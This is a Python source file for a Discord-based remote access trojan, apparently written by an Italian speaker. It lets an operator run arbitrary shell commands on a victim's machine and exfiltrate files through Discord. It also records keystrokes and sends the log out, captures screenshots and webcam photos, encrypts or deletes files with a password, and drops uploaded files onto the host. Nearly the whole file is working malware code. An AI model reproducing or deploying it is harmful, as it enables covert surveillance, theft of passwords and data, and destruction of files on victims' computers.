import discord
import os
import subprocess
import random
import pygame
import pygame.camera 
import tkinter as tk
from tkinter import messagebox
import socket
import pyautogui
import threading
from pynput import keyboard
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
from cryptography.fernet import InvalidToken
import requests










intents = discord.Intents.default()
intents.message_content = True  
intents.guilds = True  

client = discord.Client(intents=intents)

CHANNEL_ID = None  


directory_base = os.getcwd()

@client.event   
async def on_ready():
    global CHANNEL_ID
    print(f'We have logged in as {client.user}')
    
    # Verifica i server a cui il bot è connesso
    if not client.guilds:
        print("The bot is not connected to any server.")
        return

    guild = discord.utils.get(client.guilds) 

    # Controlla se il file ID.txt esiste, altrimenti generane uno
    if not os.path.isfile('ID.txt'):
        id_generato = random.randint(1000, 9999) 
        with open('ID.txt', 'w') as id_file:
            id_file.write(str(id_generato))  
        print(f'ID generated and saved in ID.txt: {id_generato}')

        # Controlla se il canale "NEW REMOTE" esiste
        new_remote_channel = discord.utils.get(guild.channels, name="new-remote")
        if new_remote_channel:
            # Invia l'ID del bot nel canale "NEW REMOTE"
            await new_remote_channel.send(f'The new ID generated is: {id_generato}')
            print(f'ID sent in the channel “new-remote”: {id_generato}')
        else:
            print('The “new-remote” channel does not exist.')
        CHANNEL_ID = id_generato
    else:
        # Leggi l'ID dal file ID.txt
        with open('ID.txt', 'r') as id_file:
            CHANNEL_ID = id_file.read().strip()  
        print(f'Existing ID found in ID.txt: {CHANNEL_ID}')
        new_remote_channel = discord.utils.get(guild.channels, name=CHANNEL_ID)
        await new_remote_channel.send(f"I'm ON!")
        

@client.event  
async def on_message(message):
    global CHANNEL_ID
    comando = message.content
    
    if message.author == client.user:
        return

 
    if str(message.channel.name) != f'{CHANNEL_ID}':
        return  

    if comando == "help":
        await message.channel.send("Available commands:\nls | show files in current directory\ncd | change directory\ncmd | execute command in console\nping | Pong!\nid | operations on ID\nfile | File management\nmessage | show message on screen\nnetwork | Commands on network\nsystem | Operations on hardaware\n\nTo send a file upload it to the channel and it will be downloaded")



    elif comando.startswith('ls'):
        if comando == "ls help":
            await message.channel.send("This command shows the contents of the current directory and the current directory\nls | Show data\nls help | Show this help") 
        else:
            risposta = "You are in: {}\n{}".format(os.getcwd(), os.listdir('.'))
            risposta = risposta.replace("[", "")
            risposta = risposta.replace("]", "")
            await message.channel.send(risposta)  
        






    elif comando.startswith("cd "):
        directory = comando.replace("cd ", "").strip()  
        if comando == "cd help":
            await message.channel.send("This command is used to change the directory in which you are located\ncd [direcory] | Change the directory to the specified one\ncd /// | Return to the directory where the program is installed\ncd help | Show this help")
        else:
            try:
                if directory == "..":  
                    os.chdir('..')
                elif directory == "///":
                    os.chdir(directory_base)
                else:
                    os.chdir(directory) 
                risposta = f"Directory changed to: {os.getcwd()}" 
                await message.channel.send(risposta)
            except:
                risposta = f"Error: Directory {directory} is non-exist" 
                await message.channel.send(risposta)




        

    elif comando.startswith("cmd "):
        prompt = comando.replace("cmd ", "")
        if prompt == "help":
            await message.channel.send("This command executes a command in the terminal\ncmd [command] | Execute a command in the system terminal\ncmd help | Show this guide ")
        else:
            try:
                result = subprocess.run(prompt, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
                risposta = result.stdout if result.stdout else result.stderr 
            except Exception as e:
                risposta = f"Error during the execution of the command: {str(e)}"
            await message.channel.send(risposta)







    elif comando == "ping" or comando == "ping help":
        if "help" in comando:
            await message.channel.send("This command allows you to verify that the remote computer is turned on\nping | If you get 'Pong!' it works!\nping help | Show this help")
        else:
            await message.channel.send("Pong!")







  
        
   







    elif comando.startswith("file "):
        if "get" in comando:
            filename = comando.replace("file get ", "")

            if os.path.exists(filename):
                with open(filename, 'rb') as file:
                    await message.channel.send("This is your file:", file=discord.File(file, filename=filename))
            else:
                await message.channel.send(f"Error: the file does not exist.")     
        elif "read" in comando:
            file = comando.replace("file read ","")        
            with open(file, "r") as f:
                contenuto = [linea.strip() for linea in f]
            risposta = "\n".join(contenuto)     
            await message.channel.send(risposta)
        elif "remove" in comando:
            file = comando.replace("file remove ", "")
            try:
                os.remove(file)
                await message.channel.send("File removed")
            except:
                await message.channel.send("Error: Error in removing the file") 
        

        elif "decrypt" in comando:
            comando = comando.replace("file decrypt ", "")
            if " | " in comando:
                password, file = comando.split(' | ') 
                password_provided = password 
                password = password_provided.encode()  
                salt = b'salt_'  
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=100000,
                    backend=default_backend()
                )
                key = base64.urlsafe_b64encode(kdf.derive(password)) 
                with open(file, 'rb') as f:
                    data = f.read() 
                fernet = Fernet(key)
                try:
                    decrypted = fernet.decrypt(data)
                    with open(file, 'wb') as f:
                        f.write(decrypted)  
                    await message.channel.send("Successful deciphering!")
                except InvalidToken:
                    await message.channel.send("Error: invalid token, verify password or file.")
                except Exception as e:
                    await message.channel.send(f"Unknown error: {str(e)}")

            else:
                await message.channel.send("Error, missing character ( | )")

        elif "crypt" in comando:
            comando = comando.replace("file crypt ", "")
            if " | " in comando:
                password, file = comando.split(' | ') 
                password_provided = password 
                password = password_provided.encode()  
                salt = b'salt_'  
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=100000,
                    backend=default_backend()
                )
                key = base64.urlsafe_b64encode(kdf.derive(password)) 
                with open(file, 'rb') as f:
                    data = f.read() 
                fernet = Fernet(key)
                encrypted = fernet.encrypt(data)
                with open(file, 'wb') as f:
                    f.write(encrypted) 
                await message.channel.send("Encryption performed") 
            else:
                await message.channel.send("Error, missing character ( | )")
            
        elif "help" in comando:
            await message.channel.send("This command aids in file management\nfile get [filename] | | upload a file to discord\nfile read [filename] | | read a file\nfile remove [filename] | | remove a file\nfile crypt [password] | [filename] | | encrypt a file using a given password\nfile decrypt [password] | [filename] | | decrypt a file using a password")
        else:
            await message.channel.send("File command not recognized, run 'file help'")




                   
    elif message.attachments:
        for attachment in message.attachments:            
            await attachment.save(attachment.filename)
            await message.channel.send(f'File "{attachment.filename}" downloaded and saved.')









    elif comando.startswith("message "): 
        if comando == "message help":
            await message.channel.send("Command used to show messages to screen\nmessage [title] | [message]\nmessage help | Show this guide")
        else:
            comando = comando.replace("message ", "")
            titolo, messaggio = comando.split('|')     
            root = tk.Tk()
            root.withdraw() 
            messagebox.showinfo(titolo, messaggio)
            root.destroy()
            await message.channel.send("The message has been closed by the user")









    elif comando.startswith("network "):
        if comando == "network help":
            await message.channel.send("This command manages the network\nnetwrok interface | Show network interfaces")
        elif "interface" in comando:
            interfacce = socket.if_nameindex()
            interfacce = '\n'.join([f'{inter[0]}: {inter[1]}' for inter in interfacce])
            risposta = "Here are the network interfaces: \n\n" + interfacce
            await message.channel.send(risposta)
        elif "ip" in comando:
            try:
                response = requests.get('https://api.ipify.org?format=json')
                ip_data = response.json()
                ip_data = str(ip_data)
                ip_data = ip_data.replace("{'ip': '", "")
                ip_data = ip_data.replace("'}", "")
                risposta = "The pubblic IP address is: "+str(ip_data)
                await message.channel.send(risposta)           
            except Exception as e:
                risposta = (f"Error: {e}")
                await message.channel.send(risposta)
                

        else: 
            await message.channel.send("Network command not recognized, write 'network help'")
            
    






    elif comando.startswith("system "):
        if "screenshot" in comando: 
            if "help" in comando:
                await message.channel.send(f"This command allows you to take a screenshot of the remote system\nsystem screenshot | Capture and send screenshot\nsystem screenshot help | Show this help")
            else:
                my_screenshot = pyautogui.screenshot()
                my_screenshot.save(r"1234.png")         

                if os.path.exists("1234.png"):
                    with open("1234.png", 'rb') as file:
                        await message.channel.send("Here is the screenshot:", file=discord.File(file, filename="1234.png"))
                    os.remove("1234.png") 
                else:
                    await message.channel.send(f"Error: screenshot is non-existent.")

        elif "keylogger" in comando:
            filelocation = directory_base+"keyboard.txt"
            if "enable" in comando:   
                global listener, frase
                frase = ""
                def on_press(key):
                    global frase
                    key = str(key)
                    try:
                        frase = frase + (f'{key.char}')
                    except AttributeError:
                        if "Key.space" in key:
                            frase = frase + " "
                        elif "Key.backspace" in key:
                            frase = frase[:-1]
                        elif "Key.enter" in key:
                            frase = frase + "\n"
                        else:
                            frase = frase + (f'{key}')
                    frase = frase.replace("'", "")
                    print(frase)
                   
                    with open(filelocation, "w") as pippiripettennusa:
                        pippiripettennusa.write(frase)
                def start_listener():
                    global listener
                    listener = keyboard.Listener(on_press=on_press)
                    listener.start()
                    listener.join()
                listener_thread = threading.Thread(target=start_listener)
                listener_thread.start()
                await message.channel.send("Keylogger started")
            elif "stop" in comando:
                global listener
                if listener is not None:
                    listener.stop()  
                    listener = None  
                    await message.channel.send("Keylogger stopped")
                else:
                    await message.channel.send("No keyloggers running")
            elif "get" in comando:
                filelocation = directory_base+"keyboard.txt"
                if os.path.exists(filelocation):
                    with open(filelocation, 'rb') as file:
                        await message.channel.send("Here is the keylogger:", file=discord.File(file, filename=filelocation))
                    os.remove(filelocation)
                else:
                    await message.channel.send("Error: keyboard.txt file not found")
            elif comando == "system keylogger help":
                await message.channel.send("This command handles keylogger\nsystem keylogger enable | Start keylogger\nsystem keylogger stop | Stop keylogger\nsystem keylogger get | Show keylogger\nsystem keylogger help results | Show this help")

            else:
                await message.channel.send("System keylogger does not have this attribute, try 'system keylogger help'". format(suggerimento))
                    
                    

        elif comando.startswith("system camera "):
            if "take" in comando:
                pygame.camera.init()
                camlist = pygame.camera.list_cameras()   
                if camlist:                
                    cam = pygame.camera.Camera(camlist[0], (640, 480))     
                    cam.start() 
                    image = cam.get_image()             
                    pygame.image.save(image, "img.png") 
                    cam.stop()
                    if os.path.exists("img.png"):
                        with open("img.png", 'rb') as file:
                            await message.channel.send("Camera result:", file=discord.File(file, filename="img.png"))
                        os.remove("img.png")
                    else:
                        await message.channel.send(f"Error: the photo does not exist.")     
                else: 
                    await message.channel.send("The device does not have a camera.") 
            elif "help" in comando:
                await message.channel.send("This command allows you to manage the computer remote\nsystem camera take | Take and send a photo\nsystem camera help | Show this guide")
            else:
                await message.channel.send("Error: Camera does not have this attribute, try 'system camera help'")
       
       
       
       
        elif comando == "system help":
            await message.channel.send("This command is used to interact with the hardware components\nsystem screenshot | Take a screenshot of the computer\nsystem keylogger [option] | Allows you to use the keylogger\nsystem camera | Allows you to use the remote camera | Show uest help")
        else:            
            await message.channel.send("System does not have this attribute, try 'system help'")
            



    elif comando.startswith("sonne "):
        if comando.startswith("sonne id "):
            if "change" in comando:
                nuovo_id = comando.replace("sonne id change ", "")
                with open("ID.txt", "w") as file:
                    file.write(nuovo_id)
                risposta = "Id successfully modified by: {} a {}. Edit channel name".format(CHANNEL_ID, nuovo_id)
                CHANNEL_ID = nuovo_id
                await message.channel.send(risposta)
            elif "reset" in comando:
                try:
                    os.remove("ID.txt")
                    await message.channel.send("ID successfully deleted, a new one will be generated the next time the program is restarted")
                except:
                    await message.channel.send("Error in resetting ID, are you in the right directory?")
            elif "help" in comando:
                await message.channel.send("The 'id' server command to manage the device id\nsonne id change [new id] | Change the previous ID to the one specified\nsonne id reset | Deletes the ID in the file, a program restart is required for the change to take place, a message will be sent in the 'new-remote'\nsonne id help | Show this guide")
            else:
                await message.channel.send("Error: invalid attribute for id\nWrite 'sonne id help' for help")

        elif comando == "sonne kill-client":
            await message.channel.send("Il client è stato fermato, non sarai più in grado di comunicarci")
            exit()
        elif comando == "sonne help":
            await message.channel.send("Questo comando gestisce le impostazioni relative al programma\nsonne id | gestisce l'ID del client\nsonne kill-client | Ferma il client\nsonne help | Mostra questa guida")
        






    else:
        await message.channel.send("Incorrect command.")




client.run('YOUR TOKEN')
